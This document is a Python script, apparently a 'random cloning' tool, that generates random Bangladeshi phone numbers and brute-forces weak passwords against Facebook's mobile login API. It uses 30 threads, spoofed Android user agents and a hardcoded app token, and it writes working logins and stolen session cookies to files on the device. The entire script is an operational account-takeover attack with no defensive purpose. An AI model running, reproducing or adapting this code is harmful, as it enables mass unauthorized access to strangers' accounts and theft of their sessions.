""" source by Tamim Ahmed >> MR-GREEN"""
#─────────────{ IMPORT }─────────────#
import os,random,string,requests,re,sys,uuid,json
from os import system as clr  
from concurrent.futures import ThreadPoolExecutor as tred
#─────────────{ LOOP }─────────────#
oks=[];cps=[];loop=0
#─────────────{ COLOUR }─────────────#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';P = '\x1b[38;5;146m';T = "\x1b[38;5;6m";L = "\x1b[38;5;183m"
#─────────────{ LINEX }─────────────#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}──────────────────────────────────────────────────')
#─────────────{ UA }─────────────#
def fuckx():
	model = random.choice(["SM-J200H", "SM-J320H", "SM-J400F", "SM-J510H", "SM-G570F", "SM-J600FN", "SM-J710F", "SM-J730F", "SM-J810M", "SM-N950X", "SM-A013F", "SM-A500M", "SM-A515F"])
	ufff = "[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/en_US;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	return ufff
#─────────────{ LOGOX }─────────────#
logo=(f'''{A}
{G}┏┓┓ ┏┏┓┏┓ {A}│{G} CEO  : HABIB\______:*\❷/3:\⓿/:\❷/3:)
{G}┗┓┃┃┃┣┫┃┓ {A}│{G} TOOL : RANDOM CLONING
{G}┗┛┗┻┛┛┗┗┛ {A}│{G} VER  : {A}0.0
{A}──────────────────────────────────────────────────''')
#─────────────{ MENU }─────────────#
def menu():
    clear()
    print(f'{L}|{S}1{L}|{G} RANDOM CLONING ');print(f'{L}|{S}0{L}|{G} EXIT CLONING ');linex();option=input(f'{L}|{S}?{L}|{G} CHOICE : ')
    if option in ['A','1']:__BD__()
    if option in ['B','2']:exit()
    else:exit(f'{L}|{S}~{L}|{G} OPTION NOT FOUND')
#─────────────{ BD-MENU }─────────────#
def __BD__():
    user=[]
    clear()
    print(f'{L}|{S}~{L}|{G} EXAMPLE : 017 | 018 | 019 | 016');linex();code=input(f'{L}|{S}?{L}|{G} CHOICE  : ')
    clear();print(f'{L}|{S}~{L}|{G} EXAMPLE : 5000 | 5000 | 9999 | 99999');linex()
    try:
        limit=int(input(f'{L}|{S}?{L}|{G} CHOICE  : '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as habibx:
    	clear();tl=str(len(user))
    	print(f'{L}|{S}~{L}|{G} RANDOM UID :{A} {tl} ');print(f'{L}|{S}~{L}|{G} SIM CODE   :{A} {code} ');print(f'{L}|{S}~{L}|{G} CHANGE FAKE APN IN EVERY {A}5{G} MINT ');linex()
    	for psx in user:
    	    ids=code+psx
    	    passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
    	    habibx.submit(__randm_m1__,ids,passlist)
    print(" ");linex();print(f'{L}|{S}~{L}|{G} THE PROGRESS HAS BEEN COMPLETE ');print(f'{L}|{S}~{L}|{G} TOTAL OK ID : '+str(len(oks)));print(f'{L}|{S}~{L}|{G} TOTAL CP ID : '+str(len(cps)));linex();exit()
#─────────────{ RANDOM-METHOD-M1 }─────────────#
def __randm_m1__(ids,passlist):
    global oks,cps,loop
    gf = random.choice([A,R,Y,G,B,G1,G2,G3,G4,G4,X,X1,X2,X3,X4,X5,S,M,P,T,L])
    try:
        for pas in passlist:
            sys.stdout.write(f'\r\r{L}|{G}SWAG-XD{L}|{gf} %s {L}|{G} %s{L}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': fuckx(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print(f'\r\r\x1b[38;5;46m|SWAG-OK| '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print(f'\r\r\x1b[1;97m|COKI| '+coki)
                    open("/sdcard/SWAG-RANDM-OK-COOKIE.txt","a").write(uid+'|'+pas+'|'+str(coki)+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print(f'\r\r\x1b[38;5;196m|SWAG-CP| '+str(uid)+' | '+pas+'\033[1;37m')
                open('/sdcard/SWAG-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#─────────────{ END }─────────────#
menu()